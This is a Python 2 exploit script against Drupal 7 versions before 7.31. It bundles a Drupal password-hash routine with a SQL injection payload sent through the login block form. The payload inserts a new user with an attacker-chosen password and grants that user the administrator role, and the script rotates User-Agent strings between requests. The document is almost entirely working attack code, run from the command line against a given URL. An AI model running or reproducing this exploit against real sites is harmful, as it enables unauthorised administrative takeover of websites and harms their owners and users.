#!/usr/bin/python2
#-*- coding:utf-8 -*-

import hashlib
import time
import sys
import random
import urllib2

try:
  from datetime import datetime
except ImportError:
  print("\033[31m[!] Error Datetime Not Found !")

try:
    import requests
except ImportError:
    print("\033[31m[!] Error Requests Not Found !")


# from drupalpass import DrupalHash
class DrupalHash:

  def __init__(self, stored_hash, password):
    self.itoa64 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    self.last_hash = self.rehash(stored_hash, password)

  def get_hash(self):
    return self.last_hash

  def password_get_count_log2(self, setting):
    return self.itoa64.index(setting[3])

  def password_crypt(self, algo, password, setting):
    setting = setting[0:12]
    if setting[0] != '$' or setting[2] != '$':
      return False

    count_log2 = self.password_get_count_log2(setting)
    salt = setting[4:12]
    if len(salt) < 8:
      return False
    count = 1 << count_log2

    if algo == 'md5':
      hash_func = hashlib.md5
    elif algo == 'sha512':
      hash_func = hashlib.sha512
    else:
      return False
    hash_str = hash_func(salt + password).digest()
    for c in range(count):
      hash_str = hash_func(hash_str + password).digest()
    output = setting + self.custom64(hash_str)
    return output

  def custom64(self, string, count = 0):
    if count == 0:
      count = len(string)
    output = ''
    i = 0
    itoa64 = self.itoa64
    while 1:
      value = ord(string[i])
      i += 1
      output += itoa64[value & 0x3f]
      if i < count:
        value |= ord(string[i]) << 8
      output += itoa64[(value >> 6) & 0x3f]
      if i >= count:
        break
      i += 1
      if i < count:
        value |= ord(string[i]) << 16
      output += itoa64[(value >> 12) & 0x3f]
      if i >= count:
        break
      i += 1
      output += itoa64[(value >> 18) & 0x3f]
      if i >= count:
        break
    return output

  def rehash(self, stored_hash, password):
    # Drupal 6 compatibility
    if len(stored_hash) == 32 and stored_hash.find('$') == -1:
      return hashlib.md5(password).hexdigest()
      # Drupal 7
    if stored_hash[0:2] == 'U$':
      stored_hash = stored_hash[1:]
      password = hashlib.md5(password).hexdigest()
    hash_type = stored_hash[0:3]
    if hash_type == '$S$':
      hash_str = self.password_crypt('sha512', password, stored_hash)
    elif hash_type == '$H$' or hash_type == '$P$':
      hash_str = self.password_crypt('md5', password, stored_hash)
    else:
      hash_str = False
    return hash_str


banner = '''
DDD                    l      AA     d               
D  D                   l     A  A    d       ii      
D  D rrr u  u ppp   aa l     AAAA  ddd mmmm     nnn  
D  D r   u  u p  p a a l     A  A d  d m m m ii n  n 
DDD  r    uuu ppp  aaa l     A  A  ddd m m m ii n  n 
              p                                      
              p                                      


              Created By Unam3dd

              [ Github : Unam3dd ]
              Drupal Exploit SQLI Add Admin (7 < 7.31)
'''

def check_internet():
  try:
    r = requests.get("https://google.com")
    return True
  except:
    return False


def get_ua():
  user_agent = ["Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1","Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0"]
  get_ua = random.choice(user_agent)
  return get_ua

def exploit(url,username,password):
  url_ = url+"/?q=node&destination=node"
  h = DrupalHash("$S$CTo9G7Lx28rzCfpn4WB2hUlknDKv6QTqHaf82WLbhPT2K5TzKzML", password).get_hash()
  payload = "name[0%20;insert+into+users+(status,+uid,+name,+pass)+SELECT+1,+MAX(uid)%2B1,+%27"+username+"%27,+%27"+h[:55]+"%27+FROM+users;insert+into+users_roles+(uid,+rid)+VALUES+((SELECT+uid+FROM+users+WHERE+name+%3d+%27"+username+"%27),+3);;#%20%20]=test3&name[0]=test&pass=shit2&test2=test&form_build_id=&form_id=user_login_block&op=Log+in"
  user_agent = get_ua()
  req = urllib2.Request(url_, payload, headers={ 'User-Agent': user_agent })
  content = urllib2.urlopen(req).read()
  if "mb_strlen() expects parameter 1" in content:
    print("\033[32m[\033[34m+\033[32m] Target is Vulnerable !")
    print("\033[32m[\033[34m+\033[32m] Payload Injected !")
    print("\033[32m[\033[34m+\033[32m] Username : %s" % (username))
    print("\033[32m[\033[34m+\033[32m] Password : %s" % (password))
    print("\033[32m[\033[34m+\033[32m] Target : %s" % (url_))
  else:
    sys.exit("\033[31m[!] Target is Not Vulnerable")

if __name__ == '__main__':
  print(banner)
  if len(sys.argv) <4:
    print("usage : %s <url> <username> <password>" % (sys.argv[0]))
  else:
      internet = check_internet()
      if internet ==True:
        exploit(sys.argv[1],sys.argv[2],sys.argv[3])
      else:
        sys.exit("\033[31m[!] Internet Not Found !")